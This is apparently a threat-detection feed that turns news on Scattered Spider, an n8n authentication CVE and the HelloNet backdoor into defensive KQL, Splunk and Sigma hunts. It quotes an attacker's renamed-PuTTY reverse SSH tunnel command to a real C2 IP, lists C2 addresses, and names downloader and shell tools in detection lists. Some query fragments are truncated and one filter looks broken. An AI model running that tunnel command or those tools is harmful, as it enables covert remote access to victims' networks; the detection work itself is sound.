| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

| order by files desc

Two Scattered Spider Hackers Get 5.5 Years Each for £29 Million TfL Hack

The Hacker News
2026-07-16 4 use cases 1 technique 4 kill-chain phases detected

Owen Flowers, 18, and Thalha Jubair, 20, were each sentenced to five and a half years at Woolwich Crown Court on Thursday, 16 July 2026, for the 2024 hack of Transport for London. The attack left 148 TfL systems inoperable and forced all 27,000 of the transport authority's employees into an office to get their passwords reset in person. Both the NCA and the CPS put TfL's losses and recovery

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Adversary MFA method registration within 1h of a password reset (Scattered Spider / ShinyHunters ATO) · [LLM] MFA device registered from an IP never seen for the user (attacker enrollment for persistence)
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Adversary MFA method registration within 1h of a password reset (Scattered Spider / ShinyHunters ATO) AIInstallation Medium
Hunts the Scattered Spider / ShinyHunters account-takeover sequence the article's remediation section names: a help-desk-driven or self-service password reset immediately followed by the actor registering their own MFA authentication method/device on the same account. Correlates Entra ID audit reset events with security-info registration events on the same target within a tight window. Rationale: Uses the exact identity-plane TTP the article and Google/Mandiant hardening guidance name ('verify identity on password resets, device enrollment, and MFA changes') and CISA AA23-320A documents for Scattered Spider: reset password then transfer/register MFA to an attacker device. Correlating Entra reset + security-info-registration on one target inside 1h is high-fidelity because the two rarely fire back-to-back for the same principal in normal ops. Sentinel version keys on the true target (TargetResources); Defender CloudAppEvents version keys on AccountObjectId, best-covering the self-service-reset variant. Cross-checked against: • https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a • https://cloud.google.com/blog/topics/threat-intelligence/expansion-shinyhunters-saas-data-theft • https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html
ATT&CKT1098.005 T1556.006 T1078.004
Data sourcesChange.All_Changes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate help-desk password reset where the user then genuinely re-enrolls Authenticator on a newly issued phone
  • New-hire onboarding: initial credential set followed by first-time MFA registration
  • User lost/replaced phone, IT reset password and user re-registered device same session
  • Scheduled password-expiry rotation followed by prompted re-registration of security info
  • Bulk migration to a new MFA method (e.g. org-wide passkey rollout) driving many resets+registrations
Suppression filter
| where ResetIp !in ("<corp-egress-ranges-managed-elsewhere>") == false  // prefer: exclude registrations whose RegIp is in your corporate egress CIDR and ResetActor is a verified helpdesk service account
Response runbook
1) Triage: pull the RegIp/ResetActor and check whether the reset was a verified, ticketed help-desk action; compare RegIp ASN/geo to the user's normal sign-in locations and confirm the newly registered method is one the user recognises. 2) Contain: if unverified, revoke the user's sessions/refresh tokens, remove the rogue authentication method, disable the account or force a verified re-registration, and block the RegIp. 3) Hunt: look for post-ATO activity on that principal — PowerShell/browser-driven mass downloads from SharePoint/OneDrive, new OAuth app consents, inbox-forwarding rules, and additional resets across other users from the same actor/IP.
let window = 1h;
let resets = CloudAppEvents
| where Timestamp > ago(14d)
| where ActionType has_any ("Reset user password","Change user password","Reset password")
| project ResetTime = Timestamp, AccountObjectId, AccountDisplayName, ResetIp = IPAddress, ResetAction = ActionType;
CloudAppEvents
| where Timestamp > ago(14d)

MFA device registered from an IP never seen for the user (attacker enrollment for persistence) AIInstallation Medium
Hunts the attacker-device MFA enrollment step from the same campaign, pivoting on infrastructure novelty instead of reset timing: an Entra security-info registration whose source IP has never appeared in that user's successful sign-in history over the baseline window. Surfaces enrollment from actor-controlled infrastructure after vishing/credential-harvesting SSO theft. Rationale: Second, distinct pivot on the same Mandiant/CISA-confirmed step (actor 'registered their own device for MFA'): novelty of the registration source IP against 30 days of the user's own successful sign-ins. This catches enrollment from attacker infrastructure even when no password-reset event preceded it (pure credential-harvesting/vishing path), which the timing-based UC would miss. Datadog is event-scoped only because per-user IP baselining must live in a rule-level reference table. Cross-checked against: • https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a • https://cloud.google.com/blog/topics/threat-intelligence/expansion-shinyhunters-saas-data-theft • https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html
ATT&CKT1098.005 T1078.004
Data sourcesChange.All_Changes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate remote/travelling user enrolling a new authenticator from a hotel/mobile-carrier IP not in baseline
  • New employee's first MFA registration (no prior sign-in baseline exists for the account)
  • User on a personal/home network never used for corporate sign-in registering a backup method
  • Corporate VPN or ZTNA egress change putting registration behind a new public IP/ASN
  • Consultant/contractor whose device connects from a client-site network for the first time
Suppression filter
| where RegActor !endswith "$"  // and, if available, exclude RegIp within corporate egress CIDR reference set
Response runbook
1) Triage: geo/ASN-enrich RegIp and confirm whether it belongs to the user's known networks or a hosting/VPN/mobile provider inconsistent with their profile; verify the registered method with the user out-of-band. 2) Contain: if unverified, revoke sessions and refresh tokens, delete the rogue authentication method, require verified re-registration, and add RegIp to conditional-access block. 3) Hunt: check the same RegIp/ASN for registrations against other users, subsequent SaaS data access (SharePoint/OneDrive downloads, Okta/SSO app access), and new OAuth grants or mailbox rules on the affected account.

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

Exposed n8n Enterprise vulnerable to cross-issuer token-exchange auth bypass (CVE-2026-59208) AIExploitation High
Surfaces hosts where Defender/TVM reports n8n affected by CVE-2026-59208 (the JWT sub-only / iss-ignored token-exchange identity-binding flaw) or the sibling Enterprise auth flaw CVE-2026-54305. Article-specific because it keys on the exact CVE IDs and the n8n Enterprise token-exchange / Dynamic-Credentials attack surface rather than a generic 'outdated software' rule. Rationale: Anchors on the two concrete CVE IDs the article names (CVE-2026-59208 primary, CVE-2026-54305 same Enterprise surface) plus the 'n8n' product string — no narrative-only guessing. Cross-checked the GitHub Advisory DB and CVE record which confirm the sub-only-vs-iss root cause and the 2.27.4/2.28.1 fix floor. Cross-checked against: • https://cve.threatint.eu/CVE/CVE-2026-59208 • https://github.com/n8n-io/n8n/security/advisories • https://github.com/advisories/GHSA-v4pr-fm98-w9pg
ATT&CKT1212 T1556
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • n8n instance running a vulnerable version but with token exchange disabled (N8N_TOKEN_EXCHANGE_TRUSTED_KEYS unset) — flagged by version but not actually exploitable per vendor scope
  • n8n Enterprise configured with only a single trusted issuer — the flaw requires two or more trusted issuers to be exploitable
  • Community/self-hosted n8n where token exchange (Enterprise-only preview) is not licensed or available
  • TVM CVE-to-software mapping lag: a freshly patched host still showing the CVE until the next TVM scan cycle
  • Vendor-virtual-patched instances behind a WAF/reverse proxy that blocks the token-exchange endpoint
Response runbook
1) Triage: Confirm the flagged host runs n8n Enterprise and whether token exchange is actually on — check for the N8N_TOKEN_EXCHANGE_TRUSTED_KEYS env var and the token-exchange preview flag, and count configured trusted issuers (two or more = exploitable). 2) Contain: If exploitable and immediate patching isn't possible, cut the trusted-issuer list back to a single issuer or disable token exchange entirely; otherwise upgrade to the newest stable build the deployment supports (>= 2.28.1; 2.30.6 was current on 2026-07-16). 3) Hunt: Review n8n auth/audit logs on the instance for token-exchange logins where one local account was reached via tokens bearing different iss values with a colliding sub, and check for unexpected Dynamic Credentials ownership/OAuth-token changes (CVE-2026-54305) on the same hosts.

n8n running below the CVE-2026-59208 patch floor (2.27.4 / 2.28.1) in software inventory AIExploitation Medium
Catches n8n installs whose version predates the fix even before the CVE is mapped into the TVM vulnerability KB — a real gap for npm/Docker self-hosted n8n that ships a new minor most weeks. Flags any build below 2.27.4 plus the specific vulnerable 2.28.0 build (fixed in 2.28.1), per the exact floors the article states. Rationale: Uses the exact patch floors the article specifies (fix landed in 2.27.4 and 2.28.1; 2.28.0 is vulnerable) parsed against inventory version strings, so it fires even when the vuln KB hasn't yet linked CVE-2026-59208 to the n8n package — the common case for npm/Docker self-hosted installs. Version floor corroborated against the n8n release notes and GitHub advisory. Cross-checked against: • https://docs.n8n.io/release-notes • https://cve.threatint.eu/CVE/CVE-2026-59208
ATT&CKT1212 T1556
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Vulnerable version present but token exchange disabled (N8N_TOKEN_EXCHANGE_TRUSTED_KEYS unset) — not exploitable per vendor scope
  • Single-trusted-issuer configurations, which the vendor states are unaffected
  • Non-Enterprise/community n8n where the token-exchange preview feature is unavailable
  • Pre-release/build-suffixed versions (e.g. '2.28.0-rc1') that skew the split()-based semver parse
  • Sentinel and Splunk fields left empty here because the provided Sentinel schema lacks DeviceTvmSoftwareInventory and there is no CIM software-inventory datamodel — use UC1's vuln-KB query on those platforms
Suppression filter
| where SoftwareVersion !contains "-"   // drop pre-release/build-suffixed builds that break semver parsing
Response runbook
1) Triage: Verify the reported SoftwareVersion is genuine (rule out RC/build suffixes) and confirm the instance is n8n Enterprise with token exchange enabled and more than one trusted issuer. 2) Contain: Upgrade to the newest stable build (>= 2.28.1) or, as an interim measure, reduce the trusted-issuer list to one issuer or disable token exchange. 3) Hunt: Pivot the confirmed vulnerable hosts into UC1 (CVE-KB view) and review n8n audit logs for cross-issuer token-exchange sign-ins and Dynamic Credentials ownership changes on the same instances.
DeviceTvmSoftwareInventory
| where Timestamp > ago(1d)
| where SoftwareName has "n8n" or SoftwareVendor has "n8n"
| extend Ver = split(SoftwareVersion, ".")
| extend Major = toint(Ver[0]), Minor = toint(Ver[1]), Patch = toint(Ver[2])
| extend Vulnerable = (Major < 2)
    or (Major == 2 and Minor < 27)
    or (Major == 2 and Minor == 27 and Patch < 4)   // everything below 2.27.4
    or (Major == 2 and Minor == 28 and Patch == 0)  // 2.28.0 shipped the bug; fixed in 2.28.1
| where Vulnerable
| project DeviceName, DeviceId, SoftwareVendor, SoftwareName, SoftwareVersion, OSPlatform, EndOfSupportStatus
| sort by DeviceName asc
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-59208", "CVE-2026-54305")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-59208", "CVE-2026-54305")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-59208", "CVE-2026-54305")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-59208", "CVE-2026-54305")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity

Cloud identity abuse: app gets high-priv scopes, often via consent phishing.

CloudAppEvents

| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs

| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),

HelloNet persistence: wtsapi32.dll sideload dropped into ViPNet Update System dir AIInstallation High
Hunts the HelloInjector persistence artifact: a wtsapi32.dll planted in C:\Program Files (x86)\InfoTeCS\VIPNet Update System so the auto-started itcsrvup64.exe sideloads it. The legitimate wtsapi32.dll ships only in System32/SysWOW64, so any copy in the ViPNet update directory is malicious. Rationale: Anchored on the exact malicious path (C:\Program Files (x86)\InfoTeCS\VIPNet Update System) and filename (wtsapi32.dll) named in the article. wtsapi32.dll is a genuine System32 DLL, so its presence in the ViPNet update folder is a near-zero-FP sideload indicator. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://securelist.com/new-backdoor-mimics-security-software-update/116246/ • https://cyberpress.org/new-malware-masquerades-as-networking-software-updates/
ATT&CKT1574.002 T1036.005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • InfoTeCS vendor pushing an updated ViPNet build that legitimately relocates a DLL (verify Authenticode signer = InfoTeCS)
  • Backup/restore or file-recovery tooling replaying an old snapshot into the folder
  • Security analyst copying the sample into the directory during IR reproduction
  • AV quarantine-then-restore cycle re-writing the file
Suppression filter
| where InitiatingProcessVersionInfoCompanyName != "OOO Infotecs" or isempty(InitiatingProcessVersionInfoCompanyName)
Response runbook
1) Triage: pull the SHA256 of the dropped wtsapi32.dll and check Authenticode signer — a valid InfoTeCS signature is benign; unsigned/self-signed = malicious. Compare hash to the article MD5s (e.g. 16c211c96735f2fae9361b89bd7a31bf). 2) Contain: isolate the host, kill itcsrvup64.exe, and quarantine the DLL before next reboot (it auto-loads at OS start). 3) Hunt: search the estate for the same file/path, then pivot to the injected svchost (netsvcs), tesh4RPC.txt log, and outbound to 5.39.253.206.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "wtsapi32.dll"
| where FolderPath has @"\InfoTeCS\VIPNet Update System"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "wtsapi32.dll"
| where TargetFilePath has @"\InfoTeCS\VIPNet Update System"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActorUsername, Hash
| order by TimeGenerated desc
title: ViPNet Update System DLL Sideload - wtsapi32.dll Drop
id: 7b2c9f14-3a6d-4c81-9e52-1f0a8c4d6b21
status: experimental
description: Detects HelloNet/HelloInjector planting wtsapi32.dll in the ViPNet update directory for DLL side-loading via itcsrvup64.exe
references:

  - attack.t1036.005

level: high

#event_simpleName=FileWritten
| TargetFileName=/\\InfoTeCS\\VIPNet Update System\\wtsapi32\.dll$/i
| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.file_name="wtsapi32.dll" AND Filesystem.file_path="*\\InfoTeCS\\VIPNet Update System*" by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.process_guid | `drop_dm_object_name(Filesystem)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.file_name="wtsapi32.dll" AND Filesystem.file_path="*\\InfoTeCS\\VIPNet Update System*" by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.process_guid | `drop_dm_object_name(Filesystem)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
HelloInjector sideload execution: itcsrvup64.exe loads wtsapi32.dll from non-System32 path AIInstallation High
Detects the moment itcsrvup64.exe image-loads the malicious wtsapi32.dll from the ViPNet directory instead of the OS System32 copy — the execution half of the side-load that leads to svchost injection. Complements the file-drop rule by catching cases where the DLL was staged before telemetry was on. Rationale: Uses the specific loader (itcsrvup64.exe) and DLL (wtsapi32.dll) plus a System32/SysWOW64 path exclusion so only the article's malicious load path fires. Sentinel/Splunk/Falcon left empty: image-load telemetry has no clean CIM datamodel, ASIM table, or listed FDR event; expressed via Defender + Sysmon EID 7 (Sigma) only. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1574.002
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Genuine ViPNet build that legitimately bundles a private wtsapi32.dll next to itcsrvup64.exe (verify signer)
  • Application-virtualization/App-V layering that redirects System DLL loads to a package path
  • Analyst detonating the sample in a sandbox
Response runbook
1) Triage: hash the loaded wtsapi32.dll (SHA256) and confirm signer; correlate with any DeviceFileEvents drop from rule #1. 2) Contain: isolate host, terminate itcsrvup64.exe and the child svchost it injected. 3) Hunt: dump svchost.exe (netsvcs) memory for the plaintext payload, and check for C:\users\public\tesh4RPC.txt and listeners on 5003/5060.
DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "itcsrvup64.exe"
| where FileName =~ "wtsapi32.dll"
| where not(FolderPath startswith @"C:\Windows\System32") and not(FolderPath startswith @"C:\Windows\SysWOW64")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceImageLoadEvents
| where TimeGenerated > ago(30d)
| where InitiatingProcessFileName =~ "itcsrvup64.exe"
| where FileName =~ "wtsapi32.dll"
| where not(FolderPath startswith @"C:\Windows\System32") and not(FolderPath startswith @"C:\Windows\SysWOW64")
| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by TimeGenerated desc

HelloProxy AFD interception artifact: tesh4RPC.txt log written to C:\Users\Public AICommand & Control High
Hunts the operational log file HelloProxy writes for every connection its AFD_RECV hook processes (C:\users\public\tesh4RPC.txt, 'threadid: <tid> pid=<pid>'). The filename is unique to this implant, making the file-write a very high-fidelity indicator of an active in-memory proxy. Rationale: tesh4RPC.txt in C:\users\public is a verbatim, implant-unique artifact from the article (HelloProxy's AFD_RECV handler log). No legitimate software writes this name, so a single hit is high-confidence C2 activity. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1090 T1005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst copying the IOC file into Public during reproduction
  • Threat-intel sync tool staging IOC samples in a shared folder
  • Backup restore of a previously infected profile
Response runbook
1) Triage: identify the writing process (InitiatingProcessFileName) — it should resolve to an injected svchost.exe; read the file to confirm the 'threadid: <tid> pid=<pid>' format. 2) Contain: isolate host, capture a full memory image of the svchost PID before killing it (payload is in-memory only), then quarantine. 3) Hunt: check listeners on ports 5003/5060, outbound to 5.39.253.206 / 176.32.34.135, and frontpage.exe SSH tunnels.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "tesh4RPC.txt"
| where FolderPath has @"\Users\Public"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessFolderPath
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "tesh4RPC.txt"
| where TargetFilePath has @"\Users\Public"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActorUsername
| order by TimeGenerated desc

HelloNet C2 egress to 5.39.253.206 / 176.32.34.135 AICommand & Control Medium
Detects any host communicating with the two HelloNet command-server IPs, including the SSH tunnel endpoint 5.39.253.206:3522 used to relay proxied traffic back to the attackers. Straight IOC-match network detection across endpoint and NDR telemetry. Rationale: Both IPs (5.39.253.206, 176.32.34.135) are pre-extracted IOCs corroborated by the Securelist report and independent write-ups as HelloNet C2; 5.39.253.206:3522 is the confirmed SSH tunnel endpoint. Direct IOC match = high confidence. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://www.kaspersky.ru/about/press-releases/novyj-bekdor-atakoval-desyatki-rossijskih-organizacij
ATT&CKT1571 T1090
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel/sandbox infrastructure deliberately connecting to the IOC IPs for research
  • Shared hosting reuse — if the VPS is later re-leased to a benign tenant (validate timestamp against campaign window May-Jul 2026)
  • Security scanner probing the IPs from a jump host
Response runbook
1) Triage: identify the initiating process — svchost.exe (injected) or frontpage.exe (renamed PuTTY) confirms HelloNet; a browser suggests unrelated/scanner traffic. 2) Contain: block both IPs at the perimeter, isolate the host, kill the tunnel process. 3) Hunt: pivot on the host for wtsapi32.dll sideload, tesh4RPC.txt, and listeners on 5003/5060; sweep proxy logs for other internal hosts talking to these IPs.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in ("5.39.253.206", "176.32.34.135")
| project Timestamp, DeviceName, RemoteIP, RemotePort, Protocol, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessAccountName
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr in ("5.39.253.206", "176.32.34.135")
| project TimeGenerated, SrcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, NetworkProtocol, DvcAction
| order by TimeGenerated desc

NETWORK

| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_ip IN ("5.39.253.206","176.32.34.135") by All_Traffic.src_ip All_Traffic.dest_ip All_Traffic.dest_port All_Traffic.app All_Traffic.transport | `drop_dm_object_name(All_Traffic)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`

Renamed PuTTY reverse SSH tunnel to HelloNet C2 (frontpage.exe -R sftp@5.39.253.206) AICommand & Control High
Detects the HelloNet reverse-tunnel launch: a renamed PuTTY (frontpage.exe in C:\users\public\music) opening an SSH reverse tunnel (-R 8443:...:5003) to sftp@5.39.253.206 on port 3522. Anchored on the C2 user@host string and the -R reverse-forward flag so it catches the behaviour even if the binary is renamed again. Rationale: Verbatim from the article: 'C:\users\public\music\frontpage.exe -C -N -R 8443:[redacted]:5003 sftp@5.39.253.206 -P 3522'. The user@C2 string plus the -R reverse-forward flag is behaviourally unique; the frontpage.exe-in-Public\Music clause catches the masqueraded binary independently. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://cyberpress.org/new-malware-masquerades-as-networking-software-updates/
ATT&CKT1572 T1090 T1036.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A sysadmin legitimately named their own PuTTY 'frontpage.exe' (rare; validate the destination is not 5.39.253.206)
  • IT staff running authorised reverse tunnels to a jump host (destination will differ from the C2)
  • Analyst reproducing the command line in a lab
Response runbook
1) Triage: confirm destination = 5.39.253.206:3522 and forwarded local port 5003 (ties to HelloProxy listener). Recover the -pw argument for the attacker credential. 2) Contain: kill the process, block 5.39.253.206, isolate host, and rotate any exposed jump-host/service creds. 3) Hunt: enumerate all C:\Users\Public\Music binaries estate-wide and correlate with wtsapi32.dll sideload hosts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (ProcessCommandLine has "sftp@5.39.253.206" and ProcessCommandLine has "-R ")
   or (FolderPath has @"\Users\Public\Music" and FileName =~ "frontpage.exe")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where (CommandLine has "sftp@5.39.253.206" and CommandLine has "-R ") or (NewProcessName endswith @"\Users\Public\Music\frontpage.exe")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Injected svchost (netsvcs) listener on HelloProxy ports 5003/5060 AICommand & Control Medium
Detects the HelloProxy control channel: an svchost.exe process opening listening sockets on TCP 5003 and 5060 to await C2 commands after the 0x0502/ASDFASFSAFASDF handshake. A netsvcs svchost creating inbound listeners on these ports is not normal Windows service behaviour. Rationale: Ports 5003 and 5060, initiated by svchost, are the exact HelloProxy listen ports named in the article. svchost.exe (netsvcs) legitimately listens on RPC/known service ports, never on 5003/5060, so this is a clean anomaly. Kept Defender-only: ListeningConnectionCreated has no equivalent in the listed CIM, ASIM, FDR, or Sysmon event schemas. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1090 T1571
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate third-party service hosted under svchost that happens to bind 5060 (SIP) — validate the parent is services.exe and check for the co-occurring wtsapi32.dll sideload
  • Enterprise SIP/VoIP softphone service registered as an svchost-hosted service
  • Port-reuse after a benign service released 5003
Response runbook
